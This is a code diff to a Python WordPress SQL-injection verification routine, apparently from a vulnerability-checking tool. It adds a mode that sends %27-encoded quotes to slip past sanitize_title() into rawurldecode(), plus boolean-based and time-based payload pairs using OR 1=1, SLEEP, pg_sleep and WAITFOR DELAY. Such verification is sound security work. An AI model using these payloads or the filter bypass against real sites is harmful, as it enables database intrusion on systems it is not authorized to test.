@@ -4910,6 +4910,7 @@ def verify_wordpress_sqli(
     json_body: bool = False,
     required_role: str = "subscriber",
     sqli_via_request_uri: bool = False,
+    sqli_via_rawurldecode: bool = False,
 ) -> WpVerifyResult:
     """Verifica SQL injection con CINCO tecnicas, de mas a menos dura, probando varios contextos
     de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
@@ -6169,13 +6170,26 @@ def verify_wordpress_sqli(
             "diff_bytes": 0,
         })
         step("UNION no filtro nada; probando boolean-based (diferencial TRUE/FALSE)...")
-        pairs = [
-            (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
-            (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
-            (f'{orig_value}" OR "1"="1', f'{orig_value}" OR "1"="2'),
-            (f"{orig_value}') OR ('1'='1", f"{orig_value}') OR ('1'='2"),
-            (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
-        ]
+        # sqli_via_rawurldecode: la columna pasa por rawurldecode() tras sanitize_title(),
+        # por lo que un apostrofo literal es filtrado pero %27 (enviado como %2527 en wire
+        # via requests) llega como %27 a PHP y rawurldecode() lo convierte en '.
+        _rq = "%27" if sqli_via_rawurldecode else "'"
+        if sqli_via_rawurldecode:
+            pairs = [
+                (f"{orig_value}{_rq} AND (1=1)-- ", f"{orig_value}{_rq} AND (1=2)-- "),
+                (f"{orig_value}{_rq} AND 1=1-- ", f"{orig_value}{_rq} AND 1=2-- "),
+                (f"{orig_value}{_rq} OR 1=1-- ", f"{orig_value}{_rq} OR 1=2-- "),
+                (f"{orig_value}{_rq} AND (SELECT 1 FROM DUAL)=1-- ", f"{orig_value}{_rq} AND (SELECT 1 FROM DUAL)=0-- "),
+                (f"{orig_value}{_rq} OR 1=1#", f"{orig_value}{_rq} OR 1=2#"),
+            ]
+        else:
+            pairs = [
+                (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
+                (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
+                (f'{orig_value}" OR "1"="1', f'{orig_value}" OR "1"="2'),
+                (f"{orig_value}') OR ('1'='1", f"{orig_value}') OR ('1'='2"),
+                (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
+            ]
         bool_tried = []
         consistent_diffs = 0
         for true_p, false_p in pairs:
@@ -6380,15 +6394,16 @@ def verify_wordpress_sqli(
         # via query apilada con ';' -- motor distinto, sintaxis distinta, se prueban los tres en
         # vez de asumir MySQL) -- casuistica real de SQL Injection/Intruder/Generic_TimeBased.txt
         # en PayloadsAllTheThings.
+        _rq2 = "%27" if sqli_via_rawurldecode else "'"
         timing_pairs = [
-            (f"{orig_value}' AND SLEEP(5)-- -", f"{orig_value}' AND SLEEP(0)-- -"),
+            (f"{orig_value}{_rq2} AND SLEEP(5)-- -", f"{orig_value}{_rq2} AND SLEEP(0)-- -"),
             (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
-            (f"{orig_value}' OR SLEEP(5)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
+            (f"{orig_value}{_rq2} OR SLEEP(5)-- -", f"{orig_value}{_rq2} OR SLEEP(0)-- -"),
             # Small-SLEEP OR variant: fires for every table row (N×SLEEP), so SLEEP(5) can
             # easily exceed the 20s request timeout when the table has many rows (e.g. postmeta
             # with 20-30 WP core rows). SLEEP(0.3) keeps the total at ~6-9s even with 30 rows,
             # well within timeout and above the 3.5s detection threshold.
-            (f"{orig_value}' OR SLEEP(0.3)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
+            (f"{orig_value}{_rq2} OR SLEEP(0.3)-- -", f"{orig_value}{_rq2} OR SLEEP(0)-- -"),
             (f"{orig_value}' AND pg_sleep(5)-- -", f"{orig_value}' AND pg_sleep(0)-- -"),
             (f"{orig_value} AND pg_sleep(5)-- -", f"{orig_value} AND pg_sleep(0)-- -"),
             (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
